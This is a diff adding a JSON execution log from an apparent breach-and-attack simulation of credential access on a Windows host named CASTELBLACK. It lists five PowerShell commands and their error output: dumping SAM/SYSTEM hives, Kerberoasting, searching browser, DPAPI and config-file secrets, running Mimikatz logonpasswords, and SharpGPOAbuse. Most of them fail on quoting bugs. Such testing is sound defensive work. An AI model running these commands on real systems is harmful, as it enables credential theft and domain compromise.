@@ -1,0 +1,88 @@
+{
+  "operation_id": "4a6ec1ec-4bc3-4c47-a1d5-4b464bf91a46",
+  "engagement_id": "2b46bea0-8544-43f1-a134-f53563af2133",
+  "name": "Auto Test - APT-CredAccess-CASTELBLACK",
+  "status": "completed",
+  "environment": {
+    "environment_id": "82e01037-11db-4b59-a79c-661b3838cfea",
+    "name": "Test Prod"
+  },
+  "adversary": {
+    "adversary_id": "5d88d5b8-7f67-4efc-ab6d-261262d60211",
+    "engagement_id": "2b46bea0-8544-43f1-a134-f53563af2133",
+    "name": "APT-CredAccess-CASTELBLACK",
+    "is_tested": true
+  },
+  "required_platforms": [
+    "windows"
+  ],
+  "platform_agents": {
+    "windows": {
+      "agent_id": "277f297f",
+      "hostname": "CASTELBLACK",
+      "platform": "windows"
+    },
+    "linux": null,
+    "mac": null
+  },
+  "progress": {
+    "total_abilities": 5,
+    "completed_abilities": 5,
+    "progress_percent": 100
+  },
+  "started_at": "2026-06-24T13:13:28.967936",
+  "completed_at": "2026-06-24T13:14:04.961495",
+  "kill_switch_triggered": false,
+  "execution_logs": [
+    {
+      "ability_id": "a880be9d-23e6-451a-ae54-d1970770dafd",
+      "stage_id": "2ca44f58-ea81-4b00-a205-e901382af6de",
+      "command_executed": "$d='C:\\\\Windows\\\\Temp\\\\bas\\\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { reg save HKLM\\\\SAM $d\\\\sam.hiv /y; reg save HKLM\\\\SYSTEM $d\\\\system.hiv /y; \\\"SAM/SYSTEM hives saved successfully\\\" } catch { \\\"ERROR: $_\\\" }) | Tee-Object -FilePath $d\\\\local_hashes.txt",
+      "stdout": "",
+      "stderr": "ERROR: Invalid key name.\nType \"REG SAVE /?\" for usage.\nERROR: Invalid key name.\nType \"REG SAVE /?\" for usage.\n\\ERROR: $_\\ : The term '\\ERROR: $_\\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the \nname, or if a path was included, verify that the path is correct and try again.\nAt line:1 char:241\n+ ... SAM/SYSTEM hives saved successfully\\\" } catch { \\\"ERROR: $_\\\" }) | Te ...\n+                                                     ~~~~~~~~~~~~~\n    + CategoryInfo          : ObjectNotFound: (\\ERROR: $_\\:String) [], CommandNotFoundException\n    + FullyQualifiedErrorId : CommandNotFoundException\n \n",
+      "exit_code": 0,
+      "executor": "",
+      "timestamp": "2026-06-24T13:13:31.466890"
+    },
+    {
+      "ability_id": "ebfe3d57-1b83-4e3e-82c9-17502db1ee14",
+      "stage_id": "8bcacc64-6b4e-4781-91dc-681eb4a5c21e",
+      "command_executed": "$d='C:\\\\Windows\\\\Temp\\\\bas\\\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $hashes = @(); $searcher = [adsisearcher]'(samAccountType=805306368)'; $searcher.PageSize = 1000; $users = $searcher.FindAll(); foreach ($u in $users) { if ($u.Properties.serviceprincipalname) { $sam = $u.Properties.samaccountname[0]; foreach ($spn in $u.Properties.serviceprincipalname) { try { Add-Type -AssemblyName System.IdentityModel; $req = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn; $hashes += \\\"KERBEROASTED: SPN=$spn User=$sam\\\" } catch { $hashes += \\\"FAILED: SPN=$spn User=$sam Error=$($_.Exception.Message)\\\" } } } }; $asrepSearcher = [adsisearcher]'(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'; foreach ($u in $asrepSearcher.FindAll()) { $hashes += \\\"AS-REP ROASTABLE: User=$($u.Properties.samaccountname[0])\\\" }; $hashes -join [char]13+[char]10 } catch { \\\"ERROR: $_\\\" }) | Tee-Object -FilePath $d\\\\tickets.txt",
+      "stdout": "",
+      "stderr": "\\ERROR: $_\\ : The term '\\ERROR: $_\\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the \nname, or if a path was included, verify that the path is correct and try again.\nAt line:1 char:969\n+ ... \\\" }; $hashes -join [char]13+[char]10 } catch { \\\"ERROR: $_\\\" }) | Te ...\n+                                                     ~~~~~~~~~~~~~\n    + CategoryInfo          : ObjectNotFound: (\\ERROR: $_\\:String) [], CommandNotFoundException\n    + FullyQualifiedErrorId : CommandNotFoundException\n \n",
+      "exit_code": 0,
+      "executor": "",
+      "timestamp": "2026-06-24T13:13:37.763176"
+    },
+    {
+      "ability_id": "7c16d2d3-d0c2-4c45-9b41-2ca2776fb291",
+      "stage_id": "133182ec-464a-4a63-b9af-a0b37f900584",
+      "command_executed": "$d='C:\\\\Windows\\\\Temp\\\\bas\\\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $results = @(); $chromePath = \\\"$env:USERPROFILE\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\\\"; if (Test-Path $chromePath) { $results += \\\"Found Chrome Login Data at: $chromePath\\\" }; $dpapiPath = \\\"$env:APPDATA\\\\Microsoft\\\\Protect\\\"; if (Test-Path $dpapiPath) { $results += \\\"Found DPAPI folders at: $dpapiPath\\\"; Get-ChildItem -Path $dpapiPath -Recurse -File -ErrorAction SilentlyContinue | foreach { $results += \\\"DPAPI: $($_.FullName)\\\" } }; $searchDirs = @(\\\"C:\\\\inetpub\\\", \\\"C:\\\\Windows\\\\Panther\\\", \\\"$env:USERPROFILE\\\\Documents\\\"); foreach ($dir in $searchDirs) { if (Test-Path $dir) { $files = Get-ChildItem -Path $dir -Recurse -Include *.config,*.xml,*.txt,*.ini -ErrorAction SilentlyContinue | Select-String -Pattern \\\"password\\\",\\\"passwd\\\",\\\"connectionString\\\",\\\"credentials\\\" -ErrorAction SilentlyContinue; foreach ($match in $files) { $results += \\\"Found potential credential in file: $($match.Path) Line: $($match.LineNumber) - $($match.Line)\\\" } } }; if ($results.Count -eq 0) { $results += \\\"No potential credentials or DPAPI/browser secrets detected in audited paths\\\" }; $results -join [char]13+[char]10 } catch { \\\"ERROR: $_\\\" }) | Tee-Object -FilePath $d\\\\dpapi_browser.txt",
+      "stdout": "",
+      "stderr": "At line:1 char:612\n+ ... DPAPI: $($_.FullName)\\\" } }; $searchDirs = @(\\\"C:\\\\inetpub\\\", \\\"C:\\\\W ...\n+                                                                 ~\nMissing argument in parameter list.\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\n    + FullyQualifiedErrorId : MissingArgument\n \n",
+      "exit_code": 1,
+      "executor": "",
+      "timestamp": "2026-06-24T13:13:43.567719"
+    },
+    {
+      "ability_id": "90affe17-02a9-443f-a661-23413a85585b",
+      "stage_id": "973807c2-3666-4de2-8346-6194c4f9957e",
+      "command_executed": "$d='C:\\\\Windows\\\\Temp\\\\bas\\\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { . .\\\\Invoke-Mimikatz.ps1; $res = Invoke-Mimikatz -Command \\\"privilege::debug sekurlsa::logonpasswords\\\" -ErrorAction Stop; '{\\\"status\\\": \\\"success\\\", \\\"output\\\": \\\"' + $res.Replace('\\\"', '\\\\\\\"').Replace(\\\"`r`n\\\", \\\"\\\\n\\\") + '\\\"}' } catch { '{\\\"status\\\": \\\"failed\\\", \\\"error\\\": \\\"' + $_.Exception.Message.Replace('\\\"', '\\\\\\\"') + '\\\"}' }) | Tee-Object -FilePath $d\\\\lsass_parsed.json",
+      "stdout": "",
+      "stderr": "At line:1 char:318\n+ ... cess\\\", \\\"output\\\": \\\"' + $res.Replace('\\\"', '\\\\\\\"').Replace(\\\"`r`n\\\" ...\n+                                                                  ~\nMissing ')' in method call.\nAt line:1 char:318\n+ ... \\\"output\\\": \\\"' + $res.Replace('\\\"', '\\\\\\\"').Replace(\\\"`r`n\\\", \\\"\\\\n\\ ...\n+                                                          ~~~~~~~~\nUnexpected token '\\\"`r`n\\\"' in expression or statement.\nAt line:1 char:326\n+ ... \"output\\\": \\\"' + $res.Replace('\\\"', '\\\\\\\"').Replace(\\\"`r`n\\\", \\\"\\\\n\\\" ...\n+                                                                 ~\nMissing argument in parameter list.\nAt line:1 char:113\n+ ... Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { . .\\\\In ...\n+                                                                 ~\nMissing closing '}' in statement block or type definition.\nAt line:1 char:335\n+ ... \": \\\"' + $res.Replace('\\\"', '\\\\\\\"').Replace(\\\"`r`n\\\", \\\"\\\\n\\\") + '\\\"} ...\n+                                                                  ~\nThe Try statement is missing its Catch or Finally block.\nAt line:1 char:345\n+ ... es.Replace('\\\"', '\\\\\\\"').Replace(\\\"`r`n\\\", \\\"\\\\n\\\") + '\\\"}' } catch { ...\n+                                                                 ~\nUnexpected token '}' in expression or statement.\nAt line:1 char:450\n+ ... : \\\"' + $_.Exception.Message.Replace('\\\"', '\\\\\\\"') + '\\\"}' }) | Tee-O ...\n+                                                                 ~\nUnexpected token ')' in expression or statement.\nAt line:1 char:452\n+ ... \\\"' + $_.Exception.Message.Replace('\\\"', '\\\\\\\"') + '\\\"}' }) | Tee-Obj ...\n+                                                                 ~\nAn empty pipe element is not allowed.\n    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException\n    + FullyQualifiedErrorId : MissingEndParenthesisInMethodCall\n \n",
+      "exit_code": 1,
+      "executor": "",
+      "timestamp": "2026-06-24T13:13:53.059710"
+    },
+    {
+      "ability_id": "62b6fe22-916f-482b-8ba1-5301021fe1f1",
+      "stage_id": "2d38a689-71ab-4e41-a0b5-051141e2847e",
+      "command_executed": "$d='C:\\\\Windows\\\\Temp\\\\bas\\\\cred_access'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { SharpGPOAbuse.exe --help } catch { \\\"ERROR: $_\\\" }) | Tee-Object -FilePath $d\\\\gpo_abuse.txt",
+      "stdout": "",
+      "stderr": "\\ERROR: $_\\ : The term '\\ERROR: $_\\' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the \nname, or if a path was included, verify that the path is correct and try again.\nAt line:1 char:150\n+ ... ll}; $(try { SharpGPOAbuse.exe --help } catch { \\\"ERROR: $_\\\" }) | Te ...\n+                                                     ~~~~~~~~~~~~~\n    + CategoryInfo          : ObjectNotFound: (\\ERROR: $_\\:String) [], CommandNotFoundException\n    + FullyQualifiedErrorId : CommandNotFoundException\n \n",
+      "exit_code": 0,
+      "executor": "",
+      "timestamp": "2026-06-24T13:13:59.321998"
+    }
+  ]
+}
